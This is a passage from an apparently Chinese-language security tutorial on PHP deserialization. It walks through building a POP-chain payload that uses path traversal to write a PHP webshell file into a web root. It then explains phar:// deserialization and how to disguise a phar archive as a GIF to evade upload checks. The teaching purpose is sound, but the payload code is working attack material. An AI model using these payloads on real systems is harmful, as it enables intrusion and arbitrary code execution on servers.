class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span></span><br><span class="line"><span class="php">      $s = intval($lyric);</span></span><br><span class="line"><span class="php">      $result = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT data FROM lyrics WHERE id=$s"</span>);</span></span><br><span class="line"><span class="php">      <span class="keyword">while</span> (($row = $result-&gt;fetch_row()) != <span class="keyword">NULL</span>) &#123;</span></span><br><span class="line"><span class="php">        $r []= unserialize(base64_decode($row[<span class="number">0</span>]));</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $r;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $ids = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"INSERT INTO lyrics (data) VALUES (\""</span> . base64_encode(serialize($lyric)) . <span class="string">"\")"</span>);</span></span><br><span class="line"><span class="php">      $res = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT MAX(id) FROM lyrics"</span>);</span></span><br><span class="line"><span class="php">      $id= $res-&gt;fetch_row(); $ids[]= intval($id[<span class="number">0</span>]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> var_dump($ids);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $ids; </span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;conn-&gt;close();</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;conn = <span class="keyword">NULL</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br></pre></td></tr></table></figure>

<p>代码这么长啊，放心，通常都会有很多用不到的类，而且一步步的回溯都不困难。</p>
<p>首先我们先找到能利用的危险函数</p>
<ul>
<li>LogWriter_File类中的file_put_contents函数，可以用来写木马。</li>
<li>OutputFilter类中，由于preg_replace函数pattern可控，如果在php版本不高于5.5的情况下可以执行命令。</li>
</ul>
<p>好，这里我就只分析file_put_contents函数写木马的POP链怎么构造。</p>
<p>​    找到了危险函数就要找可以利用的魔法方法啦，每一个类的魔法方法都一个个的跟踪的话我感觉比较麻烦，我比较喜欢通过危险函数一步步的追溯到可以利用的魔法方法。</p>
<p>​    首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，搜索在Logger类的log方法中执行了WriteLog方法，搜索发现在Song类的log函数执行了Logger类的log方法。最后，在Lyrics类的__destruct魔法方法中执行了Song类的log函数。</p>
<p>​    理清楚了这个链条，那么我们下一步就是构造反序列化数据并想办法把我们要写的木马内容和地址放在里面，而这个链条的所有类我们只需要考虑相关的类方法，在链条中不存在类方法可以直接注释掉。值得注意的是，这意味着下面的好几个类没有用了。</p>
<p>​    先把用不到的类和部分类没有用到的方法(没有用到的方法是不用分析的，包括没用的属性)。并且，要知道这些类的__construct()方法仅仅作用在于帮我们构造，如果它们里面存在限制的话我们完全可以删掉。</p>
<p>​    就比如Song类，其实我们只用到了log函数，再加上__construct方法帮我们构造，其他的函数大可删掉。log()函数用到了<code>$name</code>和<code>$group</code>属性，再加上构造POP链的<code>$logger</code>，剩下<code>$url</code>参数完全可以删掉。精简如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $matchPattern;</span><br><span class="line">  <span class="keyword">protected</span> $replacement;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filters;</span><br><span class="line">  <span class="keyword">protected</span> $endl;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = $filters;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = $endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">      $txt = $filter-&gt;filter($txt);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = str_replace(<span class="string">'\n'</span>, <span class="keyword">$this</span>-&gt;endl, $txt);</span><br><span class="line">    <span class="keyword">return</span> $txt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filename;</span><br><span class="line">  <span class="keyword">protected</span> $format;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = $format;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">"/var/log/"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logger; </span><br><span class="line">  <span class="keyword">protected</span> $name;</span><br><span class="line">  <span class="keyword">protected</span> $group;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $group, $logger)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;group = $group;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger = $logger;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">"Song "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">" by [i]"</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">"[/i] viewed.\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $lyrics;</span><br><span class="line">  <span class="keyword">protected</span> $song;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = $song;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">"&lt;/p&gt;&lt;p&gt;"</span> . str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">"&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​    到了最后的构造时间，从危险函数开始构造。</p>
<p>​        首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，LogWriter_File类的第一个参数是写入文件的文件名，第二个是LogFileFormat类实例(可以看到，第二个参数返回的是被过滤的写入文件的内容)。LogFileFormat类第一个参数是OutputFilter类实例，第二个是替换’\n’的字符。OutputFilter类第一个参数是pattern，第二个是替换对象，为了不过滤OutputFilter两个参数设置一样的。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$outputfilter = <span class="keyword">new</span> <span class="constructor">OutputFilter(<span class="string">""</span>, <span class="string">""</span>)</span>;</span><br><span class="line">$logfileformat = <span class="keyword">new</span> <span class="constructor">LogFileFormat($<span class="params">outputfilter</span>, <span class="string">"\n"</span>)</span>;</span><br><span class="line">$log_write_file = <span class="keyword">new</span> <span class="constructor">LogWriter_File('..<span class="operator">/</span>..<span class="operator">/</span>..<span class="operator">/</span>..<span class="operator">/</span><span class="params">var</span><span class="operator">/</span><span class="params">www</span><span class="operator">/</span><span class="params">html</span><span class="operator">/</span><span class="params">webshell</span>.<span class="params">php</span>', $<span class="params">logfileformat</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>​    以上再顺便把shell地址改到web目录。</p>
<p>​    接下来是Logger类用到了LogWriter_File类，只有一个参数正好是LogWrite_Fiel类。</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$logger</span> = <span class="keyword">new</span> Logger(<span class="symbol">$log</span>_write_file);</span><br></pre></td></tr></table></figure>

<p>接下来是Song类调用了Logger的log方法，参数便为WriteLog的参数，即为写入文件的内容。最后套如$Lyrics类中。</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$so</span>ng = <span class="keyword">new</span> Song(<span class="string">'JrXnm'</span>,<span class="string">'&lt;?php phpinfo() ?&gt; '</span>, <span class="symbol">$logger</span>);</span><br><span class="line"><span class="symbol">$lyrics</span> = <span class="keyword">new</span> Lyrics(<span class="string">'JrXnm'</span>,<span class="symbol">$so</span>ng);</span><br></pre></td></tr></table></figure>

<p>最后整体的payload为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $matchPattern;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $replacement;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($pattern, $repl)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;matchPattern = $pattern;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;replacement = $repl;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($data)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, $data);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $filters;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $endl;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filters, $endl)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;filters = $filters;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;endl = $endl;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($txt)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> $filter) &#123;</span></span><br><span class="line"><span class="php">      $txt = $filter-&gt;filter($txt);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $txt = str_replace(<span class="string">'\n'</span>, <span class="keyword">$this</span>-&gt;endl, $txt);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $txt;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $filename;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $format;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;format = $format;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;filename = $filename;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span></span><br><span class="line"><span class="php">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span></span><br><span class="line"><span class="php">    file_put_contents(<span class="string">"/var/log/"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $logwriter;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $logger; </span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $name;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $group;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $group, $logger)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;name = $name;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;group = $group;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logger = $logger;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">"Song "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">" by [i]"</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">"[/i] viewed.\n"</span>);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $lyrics;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $song;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($lyrics, $song)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;song = $song;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;lyrics = $lyrics;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">"&lt;/p&gt;&lt;p&gt;"</span> . str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">"&lt;/p&gt;\n"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;;</span></span><br><span class="line"><span class="php">$outputfilter = <span class="keyword">new</span> OutputFilter(<span class="string">""</span>, <span class="string">""</span>);</span></span><br><span class="line"><span class="php">$logfileformat = <span class="keyword">new</span> LogFileFormat($outputfilter, <span class="string">"\n"</span>);</span></span><br><span class="line"><span class="php">$log_write_file = <span class="keyword">new</span> LogWriter_File(<span class="string">'../../../../var/www/html/webshell.php'</span>, $logfileformat);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$logger = <span class="keyword">new</span> Logger($log_write_file);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$song = <span class="keyword">new</span> Song(<span class="string">'JrXnm'</span>,<span class="string">'&lt;?php phpinfo() ?&gt; '</span>, $logger);</span></span><br><span class="line"><span class="php">$lyrics = <span class="keyword">new</span> Lyrics(<span class="string">'JrXnm'</span>,$song);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($lyrics));</span></span><br></pre></td></tr></table></figure>

<p>构造pop链的文章还可以参考：</p>
<p><a href="https://www.anquanke.com/post/id/170681#h2-0" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链(一)</a></p>
<p><a href="https://www.anquanke.com/post/id/170714" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（二）</a></p>
<p><a href="https://www.freebuf.com/column/205855.html" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（三）</a></p>
<h4 id="反序列化配合phar-协议"><a href="#反序列化配合phar-协议" class="headerlink" title="反序列化配合phar://协议"></a>反序列化配合phar://协议</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员Sam Thomas分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。<br><strong>该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</strong></p>
<h5 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h5><h6 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h6><p>可以理解为一个标志，格式为<code>xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h6 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-d8f57b88969d1d6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h6 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h6><p>被压缩文件的内容。</p>
<h6 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件末尾，格式如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-5769eb3536407bd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h5 id="Demo测试"><a href="#Demo测试" class="headerlink" title="Demo测试"></a>Demo测试</h5><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。<br>注意：要将php.ini中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p>
<p>phar_gen.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以明显的看到meta-data是以序列化的形式存储的：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-f256545accf32fdc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-901f0c120d3edee8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过一个小demo证明一下<br>phar_test1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.phar/test.txt'</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/9113969-d5ec1857efa0ed58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其他函数当然也是可行的,当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p>
<h5 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h5><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/9113969-c872ef40ddff63ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>将后缀改为gif进行测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.gif/test.txt'</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/9113969-7a55385aec21b74f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>采用这种方法可以绕过很大一部分上传检测。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>phar文件要能够上传到服务器端。</li>
<li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。</li>
<li>文件操作函数的参数可控，且<code>: / phar</code>等特殊字符没有被过滤。</li>
</ul>
<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p>
